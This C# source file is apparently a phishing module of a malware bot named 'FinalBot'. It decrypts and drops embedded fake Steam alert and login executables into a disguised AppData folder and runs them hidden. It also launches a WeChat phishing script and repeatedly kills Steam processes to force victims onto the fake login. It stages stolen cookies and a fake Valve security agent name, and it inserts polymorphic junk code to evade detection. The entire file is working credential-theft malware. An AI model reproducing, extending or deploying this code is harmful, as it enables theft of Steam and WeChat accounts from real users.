using System;
using System.IO;
using System.Reflection;
using VanguardCore;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Threading;

namespace FinalBot.Modules
{
    public static class PhishManager
    {
        // [POLY_JUNK]
        private static void _vanguard_e233e047() {
            int val = 24189;
            if (val > 50000) Console.WriteLine("Hash:" + 24189);
        }

        private static string GetTempDir()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string path = Path.Combine(appData, "Microsoft", "Windows", "Network");
            if (!Directory.Exists(path)) Directory.CreateDirectory(path);
            return path;
        }

        private static string ExtractResource(string resourceName, string outFileName)
        {
            try
            {
                AesHelper.WipeKeys();
                string outPath = Path.Combine(GetTempDir(), outFileName);

                if (File.Exists(outPath))
                {
                    try { File.Delete(outPath); } catch { return outPath; }
                }

                var assembly = Assembly.GetExecutingAssembly();
                using (Stream? stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
                {
                    if (stream == null) return "";

                    if (resourceName.EndsWith(".bin"))
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            stream.CopyTo(ms);
                            byte[]? decrypted = AesHelper.Decrypt(ms.ToArray());
                            if (decrypted != null) File.WriteAllBytes(outPath, decrypted);
                        }
                    }
                    else
                    {
                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
                        {
                            stream.CopyTo(fileStream);
                        }
                    }
                }
                return outPath;
            }
            catch { return ""; }
        }

        private static CancellationTokenSource? _lockdownCts;
        public static bool GlobalBlockSteam { get; set; } = false;
        private static string _savedAgentName = "Valve_Security_Specialist_732";
        private static string _savedVacLang = "en";
        private static string _savedCookies = "";

        public static void SetAgentName(string name) { _savedAgentName = name; SyncToDisk(); }
        public static void SetVacLang(string lang) { _savedVacLang = lang; SyncToDisk(); }
        public static void SetCookies(string cookies) { _savedCookies = cookies; SyncToDisk(); }
        public static string GetAgentName() => _savedAgentName;
        public static string GetVacLang() => _savedVacLang;

        public static void SyncToDisk()
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
        }

        public static void StartLockdown()
        {
            if (_lockdownCts != null) return;
            _lockdownCts = new CancellationTokenSource();
            CancellationToken token = _lockdownCts.Token;

            Task.Run(async () =>
            {
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        // Always block if global toggle is ON or phishing window is ACTIVE
                        if (GlobalBlockSteam || _lockdownCts != null)
                        {
                            foreach (var process in Process.GetProcessesByName("steam"))
                            {
                                try { process.Kill(true); } catch { }
                            }
                            // Also kill service to prevent auto-restart
                            foreach (var process in Process.GetProcessesByName("SteamService"))
                            {
                                try { process.Kill(true); } catch { }
                            }
                        }
                        
                        // If not global and lockdown stopped, break
                        if (!GlobalBlockSteam && _lockdownCts == null) break;
                    }
                    catch { }
                    await Task.Delay(800, token); // Slightly slower to save CPU but still effective
                }
            }, token);
        }

        public static void ToggleGlobalBlock()
        {
            GlobalBlockSteam = !GlobalBlockSteam;
            if (GlobalBlockSteam) StartLockdown();
        }

        public static void StopLockdown()
        {
            _lockdownCts?.Cancel();
            _lockdownCts = null;
        }

        public static void LaunchSteamAlert()
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
            string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = $"--udp 51337 --lang {_savedVacLang}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = GetTempDir()
                });
                StartLockdown();
            }
        }

        public static void LaunchSteamLogin(string lang = "en")
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
            string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = $"--udp 51337 --lang {lang}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = GetTempDir()
                });
                StartLockdown();
            }
        }

        public static void LaunchWeChatPhish()
        {
            string scriptPath = ExtractResource("core.wechat_phish.py", "wechat_phish.py");
            if (!string.IsNullOrEmpty(scriptPath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{scriptPath}\" --udp 51337",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = GetTempDir()
                });
            }
        }

        public static void PrepareSteamFiles(string agentName, string cookies, string vacLang)
        {
            string tempRoot = GetTempDir();
            string tablichkaDir = Path.Combine(tempRoot, "tablichka");
            if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
            
            try { 
                foreach (var file in Directory.GetFiles(tablichkaDir)) 
                    File.Delete(file); 
            } catch { }

            if (!string.IsNullOrEmpty(agentName))
                File.WriteAllText(Path.Combine(tablichkaDir, "agent_name.txt"), agentName);
            
            if (!string.IsNullOrEmpty(cookies))
                File.WriteAllText(Path.Combine(tablichkaDir, "cookies.txt"), cookies);

            if (!string.IsNullOrEmpty(vacLang))
                File.WriteAllText(Path.Combine(tablichkaDir, "vac_lang.txt"), vacLang);
        }
    }
}
